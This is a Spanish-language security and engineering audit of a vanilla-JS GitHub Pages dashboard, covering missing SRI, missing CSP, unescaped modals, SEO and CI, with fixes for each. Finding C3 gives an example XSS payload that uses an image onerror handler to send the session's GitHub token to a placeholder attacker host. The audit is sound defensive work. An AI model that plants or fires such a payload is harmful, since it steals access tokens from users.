# Auditoría de ingeniería · v4.14

**Fecha:** 2026-05-29
**Alcance:** todo el repo tras merge de v4.14 (Fase 5 portfolio)
**Método:** revisión estática + análisis de superficie de ataque + comparación con ADRs

> **Resumen ejecutivo:** el proyecto está en muy buen estado funcional. La arquitectura es coherente, la cobertura de la API documentada en los ADRs es real y los importadores son robustos. Hay **3 hallazgos críticos** y **6 altos** relacionados con seguridad de defensa-en-profundidad (SRI, CSP, sanitización en modales) que conviene resolver antes de la siguiente fase. Ningún hallazgo crítico es explotable trivialmente desde la web pública porque dependen de que un atacante comprometa jsdelivr o coloque datos maliciosos en el repo (que requiere PAT), pero como portfolio que muestras a empleadores **conviene cerrarlos para que el proyecto resista una revisión técnica seria**.

---

## Inventario auditado

| Categoría | Tamaño |
| --- | --- |
| JS en `core/js/` | 2 223 LOC en 10 archivos |
| HTML en `dashboard/` | 4 archivos · ~3 100 LOC |
| HTML en `core/pages/` | 4 archivos · ~5 600 LOC |
| Proyectos demo | 3 (miramar, restaurante-casa-lola, demo) |
| Dependencias CDN | 7 distintas (bcryptjs, xlsx, papaparse, pdfjs, browser-image-compression, chart.js, pollinations) |
| ADRs documentadas | 2 (011 PAT, 012 conectores) |

---

## Hallazgos por severidad

### 🔴 Críticos

#### C1 · Sin Subresource Integrity (SRI) en scripts CDN

Todos los `<script src="https://cdn.jsdelivr.net/...">` se cargan sin `integrity=` ni `crossorigin=`. Verificado en `dashboard/{index,editor,wizard,metricas}.html` y `scripts/change-password.html`. Si jsdelivr es comprometido (ya pasó con polyfill.io en 2024), un atacante inyecta código arbitrario en todos los navegadores que abran el dashboard y **roba el PAT de `sessionStorage`**. Con el PAT robado, escribe en el repo del usuario.

**Mitigación:**
- Pinear hashes SRI para cada CDN. Generador: `curl -s https://cdn.jsdelivr.net/npm/bcryptjs@2.4.3/dist/bcrypt.min.js | openssl dgst -sha384 -binary | openssl base64 -A`
- Añadir `integrity="sha384-..."` + `crossorigin="anonymous"`.
- **Coste:** 1h. **Impacto:** elimina la principal vulnerabilidad de cadena de suministro.

#### C2 · Sin Content-Security-Policy

Ningún HTML define CSP (verificado con `grep -r "Content-Security-Policy"` → 0 matches). Cualquier XSS reflejado o stored sería explotable sin defensa en profundidad. Sin `frame-ancestors`, además, la app puede ser embebida en un iframe malicioso (clickjacking + PAT siphoning del mismo origen).

**Mitigación:** meta CSP en cada HTML del dashboard:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src  'self' 'unsafe-inline' https://cdn.jsdelivr.net https://image.pollinations.ai;
  connect-src 'self' https://api.github.com https://image.pollinations.ai;
  img-src     'self' data: blob: https://image.pollinations.ai;
  style-src   'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src    'self' https://fonts.gstatic.com;
  frame-ancestors 'self';">
```
**Coste:** 2h (probar que no rompe nada). **Impacto:** defensa en profundidad ante XSS futuros.

#### C3 · XSS auto-infligido en modales de `auth.js`

En `core/js/auth.js:161-163` y `264-265`, el modal del PAT y el de re-verify interpolan `${opts.title}` y `${opts.description}` directamente en `innerHTML` **sin escapar**. Si en una iteración futura algún caller pasa contenido derivado de datos del proyecto (por ejemplo, el nombre del proyecto en la descripción), un proyecto con nombre `<img src=x onerror=fetch('https://atk/'+sessionStorage.fnb_pat)>` ejecutaría JS arbitrario en el contexto del dashboard.

Hoy no hay caller que pase datos no-controlados, pero la API está abierta a hacerlo.

**Mitigación:** sanitizar `opts.title` / `opts.description` antes de interpolar, o construir el modal con `createElement` + `textContent`.
**Coste:** 2h. **Impacto:** elimina superficie de XSS futura.

---

### 🟠 Altos

#### A1 · bcryptjs 2.4.3 desactualizado

La rama 2.x lleva años sin updates. 3.x existe y tiene mejoras de WASM. Aunque el riesgo en client-side es bajo (no hay timing attacks viables), conviene pasar a `bcryptjs@3.0.x` o documentar por qué nos quedamos en 2.4.3 en un ADR.

#### A2 · Sin meta description ni Open Graph en ningún HTML

Verificado con grep: 0 matches de `og:title`, `twitter:card`, `name="description"`. El landing pierde toda la oportunidad de previews ricos cuando se comparte por LinkedIn, Twitter o se enlaza desde un CV. Para un proyecto-portfolio esto es crítico de comunicación.

**Mitigación:** añadir al menos en `index.html` (y replicar en dashboard):
```html
<meta name="description" content="Plataforma SaaS multi-tenant de gestión F&B, sin frameworks, en GitHub Pages.">
<meta property="og:title"       content="Control de Gestión F&B">
<meta property="og:description" content="Plataforma multi-tenant para hoteles y restaurantes · vanilla JS · GitHub Pages.">
<meta property="og:image"       content="https://fjmacarmen-blip.github.io/control-gestion-fnb/og-cover.png">
<meta property="og:url"         content="https://fjmacarmen-blip.github.io/control-gestion-fnb/">
<meta name="twitter:card"       content="summary_large_image">
```

#### A3 · `loginSuperAdmin` cachea fetch sin `no-store`

`auth.js:122` hace `await fetch(authPath)` sin `cache: 'no-store'`. Si rotas la password y el navegador sirve la versión cacheada del Service Worker o del HTTP cache, el login sigue funcionando con la password antigua hasta que el TTL expire. El re-verify (`auth.js:318`) sí lo hace bien con `cache: 'no-store'`. **Inconsistencia.**

**Fix:** un parámetro o un `cache: 'no-store'` también en `loginSuperAdmin`.

#### A4 · `escape()` y `unescape()` deprecated en `github-api.js`

Líneas 81-86: `utf8ToBase64` y `base64ToUtf8` usan `unescape()` y `escape()`, que están **legacy/deprecated en ECMAScript desde 2015**. Funcionan en navegadores actuales pero podrían retirarse. Sustituir por `TextEncoder`/`TextDecoder`:

```javascript
function utf8ToBase64(str) {
  return btoa(String.fromCharCode(...new TextEncoder().encode(str)));
}
function base64ToUtf8(b64) {
  const bin = atob(b64.replace(/\n/g, ''));
  return new TextDecoder().decode(Uint8Array.from(bin, c => c.charCodeAt(0)));
}
```

#### A5 · Schema inconsistente entre `productos.json` de los tres proyectos

| Proyecto | Tiene `source`? | `columnMapping` |
| --- | --- | --- |
| miramar | ✅ | poblado |
| restaurante-casa-lola | ✅ | `{}` vacío sin razón |
| demo | ❌ (solo `items`) | n/a |

`projects/demo/productos.json` no cumple el ADR 012. Si alguien ejecuta `loadProductos('demo')` y el código no tolera la ausencia de `source`, puede romperse. Hoy `productos-connector.js:131` hace `repoData.source || { type: 'static' }`, así que tolera, pero **el formato debería ser consistente**.

**Fix:** generar `source` minimal en demo y vaciar `columnMapping` solo cuando no aplica.

#### A6 · No hay tests automatizados en CI

Hay un test ad-hoc en Node para `autoMatchByFilename` (mencionado en el historial), pero no se ejecuta en cada commit. Sin CI, una regresión en `loader.js`, `auth.js` o los importers pasa desapercibida hasta el siguiente E2E manual.

**Fix:** una GitHub Action mínima:
```yaml
name: tests
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: node test/*.test.js
```
Más infraestructura que es código nuevo.

---

### 🟡 Medios

| ID | Descripción | Fix sugerido |
| --- | --- | --- |
| M1 | `innerHTML` masivo (50+ sitios) sin garantía de escape sistemático en `core/pages/` | revisar caso a caso o introducir helper `safeHTML` global |
| M2 | `fetch` sin `AbortController` / timeout en ninguna parte. Si GitHub API queda colgando, el UI espera indefinido | wrapper `fetchWithTimeout(url, opts, 30000)` |
| M3 | `bcryptjs` cargado en TODAS las páginas del dashboard (incluso métricas) cuando solo lo usa login + re-verify | lazy-load del CDN sólo cuando aparece el modal |
| M4 | Sin `loading="lazy"` en `<img>` de `recetario.html` / `presupuesto-evento.html` | añadir `loading="lazy" decoding="async"` |
| M5 | Detección de ruta en re-verify (`auth.js:308-315`) usa `pathname.includes()`. Si la app vive bajo otro path, falla silenciosamente | parámetro explícito o meta tag |
| M6 | Sin debounce en botón "publicar" → click-spam = N requests GitHub | `disabled` durante la operación + `Promise.race` |
| M7 | Editor escribe drafts en `localStorage` sin firma. Otra pestaña del mismo origen puede leerlos | aceptado por modelo de amenaza (ADR 011) — documentar |
| M8 | Mensajes de error de GitHub API se incluyen como texto en `innerHTML` (`errBody.slice(0,200)`) | comprobar todas las llamadas escapen el error |

---

### 🟢 Bajos

| ID | Descripción |
| --- | --- |
| B1 | `OFERTA BODAS Y EVENTOS 2011 HOTEL REINA CRISTINA.xls` (1.6 MB) en raíz del repo. Suma a clone size. Mover a `.gitignore` o a una rama de assets |
| B2 | Carpetas `mockups/` y `hotel/` parecen residuales — revisar si se mantienen o se archivan |
| B3 | No hay `sitemap.xml` ni `robots.txt` |
| B4 | No verificado: favicon. Si falta, GitHub Pages devuelve 404 por cada visita |
| B5 | `Pollinations.ai` recibe nombres de plato en GET URL pública → privacidad de cliente. Documentar como expected |
| B6 | `session.user.email` interpolado en innerHTML (riesgo solo si auth.json es comprometido) |
| B7 | Funciones `groupByMonth` y similares en `metrics.js` no manejan zona horaria explícita — usa la del navegador. En cliente fuera de Europa, los meses se desplazan |
| B8 | `core/js/theme.js` y `core/js/loader.js` duplican `getProjectIdFromURL` y `getRepoBase`. Pequeño DRY |

---

## Lo que está bien (vale la pena mencionarlo)

- ✅ **Whitelist regex contra path traversal** en `loader.js` y `theme.js` (`^[a-z0-9_-]+$`)
- ✅ **`escapeHtml` se usa consistentemente** en `dashboard/editor.html` (46 instancias) — los sitios principales sí están protegidos
- ✅ **`promptPasswordAndExecute` con fresh-auth window de 5 min** — implementación correcta del patrón sudo
- ✅ **PAT en `sessionStorage`** (no localStorage) — TTL natural a cierre de pestaña
- ✅ **Cache de `config.json` compartida** entre `theme.js` y `loader.js` (alto #5 v4.5.2)
- ✅ **Quota check en `saveDraft`** evita errores silenciosos de `QuotaExceededError`
- ✅ **`validateSection` valida tema contra whitelist** (alto #9 v4.5.2)
- ✅ **Importer de imágenes con auto-match correcto** tras el fix de tokenización
- ✅ **GitHub API wrapper con modo dry-run** sin PAT — testeable sin riesgo
- ✅ **Commit atómico multi-archivo** (blob → tree → commit → patch ref) — sin estado inconsistente
- ✅ **Conectores tipados con cache TTL** y separación inline vs remote
- ✅ **Cero dependencias npm en runtime** — el repo es 100% serv-able desde GitHub Pages

---

## Prioridades para Fase 6

**Sprint corto · 1-2 días (sigue siendo portfolio):**
1. C1 · Pinear SRI hashes en CDN scripts
2. C2 · Añadir meta CSP en todos los HTML
3. C3 · Sanitizar `opts.title` / `opts.description` en modales de auth
4. A2 · Meta description + Open Graph en `index.html`

**Sprint medio · 1 semana (calidad de portfolio):**
5. A4 · Sustituir `escape()`/`unescape()` por TextEncoder/Decoder
6. A5 · Normalizar `productos.json` schema en demo
7. A6 · GitHub Action mínima para tests
8. M2 · `fetchWithTimeout` wrapper

**Diferido (Fase 7 o cuando entre primer cliente real):**
9. A1 · Subir bcryptjs a 3.x
10. M1 · Auditoría línea-a-línea de `innerHTML` en `core/pages/`
11. M3 · Lazy-load de bcryptjs

---

## Métricas finales

| Dimensión | Estado |
| --- | --- |
| Seguridad (defensa en profundidad) | 🟠 mejorable — 3 críticos |
| Seguridad (modelo de amenaza ADR) | 🟢 conforme |
| Robustez / error handling | 🟢 buena |
| Performance | 🟢 buena (lazy load donde toca) |
| Accesibilidad | 🟠 mejorable (aria-labels, focus states) |
| SEO | 🔴 deficiente (sin meta description, og) |
| Calidad de código | 🟢 buena (pocos console huérfanos, pocos TODO) |
| Documentación | 🟢 muy buena (2 ADRs, README, case study) |
| Tests automatizados | 🔴 inexistentes |
| Coherencia data entre proyectos | 🟠 1 inconsistencia (productos demo) |

**Veredicto:** plataforma sólida con margen de mejora claro y acotado. Los críticos son todos de defensa en profundidad, no de vulnerabilidades explotables hoy. Cerrar el sprint corto (4 ítems · 1-2 días) deja el proyecto en estado de **excelente** para revisión técnica externa.
